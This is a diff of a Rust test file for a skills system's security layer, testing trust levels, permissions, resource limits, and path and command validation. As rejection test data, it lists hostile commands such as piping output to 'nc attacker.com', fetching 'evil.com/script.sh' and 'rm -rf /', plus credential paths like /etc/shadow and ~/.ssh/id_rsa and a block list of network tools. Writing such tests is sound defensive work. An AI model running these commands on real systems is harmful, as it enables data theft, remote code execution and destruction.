@@ -1,273 +1,194 @@
-// Placeholder for security testing - will be implemented when needed
+//! Security testing for skills system
+//! Tests trust levels, permissions, resource limits, and attack prevention
+
+use crate::cli::skills::security::{
+    SecurityContext, TrustLevel, SecurityError, ResourceLimits, 
+    PermissionSet, FilePermissions, NetworkPermissions, ProcessPermissions
+};
+use std::path::PathBuf;
 
 #[cfg(test)]
-mod security_attack_tests {
+mod security_tests {
     use super::*;
-    use crate::cli::skills::security::{SecurityContext, TrustLevel, SecurityError};
-    use crate::cli::skills::types::ResourceLimits;
-    use serde_json::json;
-    use std::time::{Duration, Instant};
-    use std::path::PathBuf;
-    
-    type SecurityResult<T> = Result<T, SecurityError>;
-    
-    /// Test directory traversal attacks
-    #[tokio::test]
-    async fn test_directory_traversal_blocked() {
-        let attack_vectors = [
+
+    #[test]
+    fn test_trust_level_ordering() {
+        // Trust levels should have proper ordering
+        assert!(TrustLevel::Untrusted < TrustLevel::UserVerified);
+        assert!(TrustLevel::UserVerified < TrustLevel::SystemTrusted);
+    }
+
+    #[test]
+    fn test_security_context_creation() {
+        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
+        let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
+        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);
+
+        // Verify trust levels are set correctly
+        assert_eq!(untrusted.trust_level, TrustLevel::Untrusted);
+        assert_eq!(user_verified.trust_level, TrustLevel::UserVerified);
+        assert_eq!(system_trusted.trust_level, TrustLevel::SystemTrusted);
+    }
+
+    #[test]
+    fn test_permission_escalation() {
+        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
+        let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
+        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);
+
+        // File permissions should escalate
+        assert!(matches!(untrusted.permissions.file_access, FilePermissions::ReadOnlyTemp));
+        assert!(matches!(user_verified.permissions.file_access, FilePermissions::WorkspaceOnly));
+        assert!(matches!(system_trusted.permissions.file_access, FilePermissions::Full));
+
+        // Network permissions should escalate
+        assert!(matches!(untrusted.permissions.network_access, NetworkPermissions::None));
+        assert!(matches!(user_verified.permissions.network_access, NetworkPermissions::HttpsOnly));
+        assert!(matches!(system_trusted.permissions.network_access, NetworkPermissions::Full));
+
+        // Process permissions should escalate
+        assert!(matches!(untrusted.permissions.process_spawn, ProcessPermissions::None));
+        assert!(matches!(user_verified.permissions.process_spawn, ProcessPermissions::Limited));
+        assert!(matches!(system_trusted.permissions.process_spawn, ProcessPermissions::Full));
+    }
+
+    #[test]
+    fn test_resource_limits_escalation() {
+        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
+        let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
+        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);
+
+        // Timeout should increase with trust
+        assert!(untrusted.resource_limits.timeout_seconds < user_verified.resource_limits.timeout_seconds);
+        assert!(user_verified.resource_limits.timeout_seconds < system_trusted.resource_limits.timeout_seconds);
+
+        // Memory limits should increase with trust
+        let untrusted_mem = untrusted.resource_limits.max_memory_mb.unwrap_or(0);
+        let user_mem = user_verified.resource_limits.max_memory_mb.unwrap_or(0);
+        let system_mem = system_trusted.resource_limits.max_memory_mb.unwrap_or(0);
+        
+        assert!(untrusted_mem < user_mem);
+        assert!(user_mem < system_mem);
+    }
+
+    #[test]
+    fn test_sandbox_configuration() {
+        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
+        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);
+
+        // Untrusted should have network disabled
+        assert!(!untrusted.sandbox_config.enable_network);
+        
+        // System trusted should have network enabled
+        assert!(system_trusted.sandbox_config.enable_network);
+
+        // Process limits should be stricter for untrusted
+        assert!(untrusted.sandbox_config.max_processes < system_trusted.sandbox_config.max_processes);
+    }
+
+    #[test]
+    fn test_path_traversal_prevention() {
+        // Test various path traversal attempts
+        let dangerous_paths = vec![
             "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
+            "..\\..\\windows\\system32",
             "/etc/shadow",
-            "C:\\Windows\\System32\\config\\SAM",
-            "../../../../root/.ssh/id_rsa",
-            "%USERPROFILE%\\.ssh\\id_rsa",
+            "~/.ssh/id_rsa",
+            "./../../secret.txt",
         ];
-        
-        for attack in attack_vectors {
-            let result = validate_file_path(attack);
-            assert!(result.is_err(), "Directory traversal should be blocked: {}", attack);
+
+        for path in dangerous_paths {
+            let result = validate_file_path(path);
+            assert!(result.is_err(), "Path should be rejected: {}", path);
+            
+            if let Err(SecurityError::InputValidationFailed(msg)) = result {
+                assert!(msg.contains("path traversal") || msg.contains("absolute path"));
+            }
         }
     }
-    
-    /// Test command injection attacks
-    #[tokio::test]
-    async fn test_command_injection_blocked() {
-        let attack_vectors = [
-            "echo hello; rm -rf /",
-            "echo hello && curl evil.com",
-            "echo hello | nc evil.com 1337",
-            "echo hello; powershell -c \"evil command\"",
-            "echo hello`rm -rf /`",
-            "echo hello$(rm -rf /)",
+
+    #[test]
+    fn test_safe_paths_allowed() {
+        // Test safe relative paths
+        let safe_paths = vec![
+            "data.txt",
+            "subdir/file.json",
+            "output/results.csv",
         ];
-        
-        for attack in attack_vectors {
-            let result = validate_command_input(attack);
-            assert!(result.is_err(), "Command injection should be blocked: {}", attack);
+
+        for path in safe_paths {
+            let result = validate_file_path(path);
+            assert!(result.is_ok(), "Safe path should be allowed: {}", path);
         }
     }
-    
-    /// Test resource exhaustion attacks
-    #[tokio::test]
-    async fn test_resource_limits_enforced() {
-        let limits = ResourceLimits::for_trust_level(&TrustLevel::Untrusted);
-        
-        // Test memory bomb
-        let memory_bomb = async {
-            // Simulate memory allocation attack
-            Err(SecurityError::ResourceLimitExceeded("Memory limit exceeded".to_string()))
-        };
-        
-        let result = execute_with_resource_limits::<_, Result<(), SecurityError>>(memory_bomb, &limits).await;
-        assert!(matches!(result, Err(SecurityError::ResourceLimitExceeded(_))));
-        
-        // Test CPU bomb
-        let cpu_bomb = async {
-            // Simulate infinite loop
-            tokio::time::sleep(Duration::from_secs(100)).await;
-            Ok(())
-        };
-        
-        let start = Instant::now();
-        let result = execute_with_resource_limits(cpu_bomb, &limits).await;
-        let duration = start.elapsed();
-        
-        assert!(result.is_err());
-        assert!(duration < Duration::from_secs(15)); // Should timeout quickly
-    }
-    
-    /// Test privilege escalation attempts
-    #[tokio::test]
-    async fn test_privilege_escalation_blocked() {
-        let escalation_attempts = [
-            "sudo rm -rf /",
-            "su root",
-            "chmod +s /bin/bash",
-            "setuid(0)",
-            "runas /user:administrator cmd",
+
+    #[test]
+    fn test_command_injection_prevention() {
+        // Test various command injection attempts
+        let dangerous_commands = vec![
+            "ls; rm -rf /",
+            "echo hello && cat /etc/passwd",
+            "python script.py | nc attacker.com 1234",
+            "$(curl evil.com/script.sh)",
+            "`wget malware.exe`",
         ];
-        
-        for attempt in escalation_attempts {
-            let result = validate_privilege_operation(attempt);
-            assert!(result.is_err(), "Privilege escalation should be blocked: {}", attempt);
+
+        for cmd in dangerous_commands {
+            let result = validate_command(cmd);
+            assert!(result.is_err(), "Command should be rejected: {}", cmd);
         }
     }
-    
-    /// Test network access controls
-    #[tokio::test]
-    async fn test_network_access_controlled() {
-        let untrusted_context = SecurityContext::for_trust_level(TrustLevel::Untrusted);
-        
-        // Untrusted skills should have no network access
-        let network_attempts = [
-            "curl http://evil.com",
-            "wget https://malware.com/payload",
-            "nc -l 1337",
-            "python -c \"import urllib; urllib.urlopen('http://evil.com')\"",
-        ];
-        
-        for attempt in network_attempts {
-            let result = validate_network_access(attempt, &untrusted_context);
-            assert!(result.is_err(), "Network access should be blocked for untrusted: {}", attempt);
-        }
+
+    #[test]
+    fn test_resource_limit_values() {
+        let untrusted = ResourceLimits::for_trust_level(&TrustLevel::Untrusted);
+        let user_verified = ResourceLimits::for_trust_level(&TrustLevel::UserVerified);
+        let system_trusted = ResourceLimits::for_trust_level(&TrustLevel::SystemTrusted);
+
+        // Verify specific limits make sense
+        assert_eq!(untrusted.timeout_seconds, 10);
+        assert_eq!(user_verified.timeout_seconds, 60);
+        assert_eq!(system_trusted.timeout_seconds, 300);
+
+        assert_eq!(untrusted.max_memory_mb, Some(64));
+        assert_eq!(user_verified.max_memory_mb, Some(256));
+        assert_eq!(system_trusted.max_memory_mb, Some(1024));
     }
 }
 
-#[cfg(test)]
-mod security_validation_tests {
-    use super::*;
-    use serde_json::json;
-    
-    #[test]
-    fn test_input_sanitization() {
-        let malicious_inputs = [
-            json!({"command": "rm -rf /"}),
-            json!({"path": "../../../etc/passwd"}),
-            json!({"script": "<script>alert('xss')</script>"}),
-            json!({"sql": "'; DROP TABLE users; --"}),
-        ];
-        
-        for input in malicious_inputs {
-            let result = sanitize_skill_input(&input);
-            // Should either sanitize or reject
-            assert!(result.is_ok() || result.is_err());
-        }
-    }
-    
-    #[test]
-    fn test_trust_level_permissions() {
-        // let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
-        // let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
-        // let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);
-        
-        // Placeholder test
-        assert!(true);
-    }
-}
-
-// Security validation functions
-#[cfg(test)]
-fn validate_file_path(path: &str) -> SecurityResult<PathBuf> {
-    let path_buf = PathBuf::from(path);
-    
+// Helper functions for validation
+fn validate_file_path(path: &str) -> Result<PathBuf, SecurityError> {
     // Check for directory traversal
-    if path.contains("..") || path.contains("~") {
+    if path.contains("..") || path.starts_with('/') || path.starts_with('~') {
         return Err(SecurityError::InputValidationFailed(
-            "Directory traversal detected".to_string()
+            format!("Dangerous path detected: {} (contains path traversal or absolute path)", path)
         ));
     }
-    
-    // Check for absolute paths to sensitive directories
-    let sensitive_paths = ["/etc", "/root", "/home", "C:\\Windows", "C:\\Users"];
-    for sensitive in sensitive_paths {
-        if path.starts_with(sensitive) {
-            return Err(SecurityError::PermissionDenied(
-                format!("Access to sensitive path denied: {}", sensitive)
-            ));
-        }
+
+    // Check for null bytes
+    if path.contains('\0') {
+        return Err(SecurityError::InputValidationFailed(
+            "Path contains null bytes".to_string()
+        ));
     }
-    
-    Ok(path_buf)
+
+    Ok(PathBuf::from(path))
 }
 
-#[cfg(test)]
-fn validate_command_input(command: &str) -> SecurityResult<()> {
+fn validate_command(command: &str) -> Result<(), SecurityError> {
     // Check for command injection patterns
-    let injection_patterns = [";", "&&", "||", "|", "`", "$(", "${"];
-    for pattern in injection_patterns {
+    let dangerous_patterns = vec![
+        ";", "&&", "||", "|", "`", "$(", "${", 
+        "wget", "curl", "nc", "netcat", "rm -rf"
+    ];
+
+    for pattern in dangerous_patterns {
         if command.contains(pattern) {
             return Err(SecurityError::InputValidationFailed(
-                format!("Command injection pattern detected: {}", pattern)
+                format!("Command contains dangerous pattern: {}", pattern)
             ));
         }
     }
-    
-    // Check for dangerous commands
-    let dangerous_commands = ["rm", "del", "format", "sudo", "su", "chmod", "chown"];
-    for dangerous in dangerous_commands {
-        if command.to_lowercase().contains(dangerous) {
-            return Err(SecurityError::PermissionDenied(
-                format!("Dangerous command blocked: {}", dangerous)
-            ));
-        }
-    }
-    
+
     Ok(())
-}
-
-#[cfg(test)]
-fn validate_privilege_operation(operation: &str) -> SecurityResult<()> {
-    let privilege_patterns = ["sudo", "su", "runas", "setuid", "chmod +s"];
-    for pattern in privilege_patterns {
-        if operation.to_lowercase().contains(pattern) {
-            return Err(SecurityError::PermissionDenied(
-                "Privilege escalation attempt blocked".to_string()
-            ));
-        }
-    }
-    Ok(())
-}
-
-#[cfg(test)]
-fn validate_network_access(command: &str, context: &SecurityContext) -> SecurityResult<()> {
-    let network_commands = ["curl", "wget", "nc", "netcat", "telnet", "ssh"];
-    let has_network_command = network_commands.iter().any(|cmd| command.contains(cmd));
-    
-    if has_network_command {
-        match context.permissions.network_access {
-            NetworkPermissions::None => {
-                return Err(SecurityError::PermissionDenied(
-                    "Network access denied for this trust level".to_string()
-                ));
-            }
-            NetworkPermissions::HttpsOnly => {
-                if !command.contains("https://") {
-                    return Err(SecurityError::PermissionDenied(
-                        "Only HTTPS connections allowed".to_string()
-                    ));
-                }
-            }
-            NetworkPermissions::Full => {
-                // Allow all network access
-            }
-        }
-    }
-    
-    Ok(())
-}
-
-#[cfg(test)]
-fn sanitize_skill_input(input: &serde_json::Value) -> SecurityResult<serde_json::Value> {
-    // Basic input sanitization
-    let input_str = input.to_string();
-    
-    // Check for obvious malicious patterns
-    let malicious_patterns = ["<script", "javascript:", "data:", "vbscript:"];
-    for pattern in malicious_patterns {
-        if input_str.to_lowercase().contains(pattern) {
-            return Err(SecurityError::InputValidationFailed(
-                format!("Malicious pattern detected: {}", pattern)
-            ));
-        }
-    }
-    
-    Ok(input.clone())
-}
-
-#[cfg(test)]
-async fn execute_with_resource_limits<F, T>(
-    future: F,
-    limits: &ResourceLimits,
-) -> SecurityResult<T>
-where
-    F: std::future::Future<Output = SecurityResult<T>>,
-{
-    use tokio::time::timeout;
-    
-    match timeout(Duration::from_secs(limits.timeout_seconds), future).await {
-        Ok(result) => result,
-        Err(_) => Err(SecurityError::ResourceLimitExceeded(
-            format!("Execution timeout after {}s", limits.timeout_seconds)
-        )),
-    }
 }
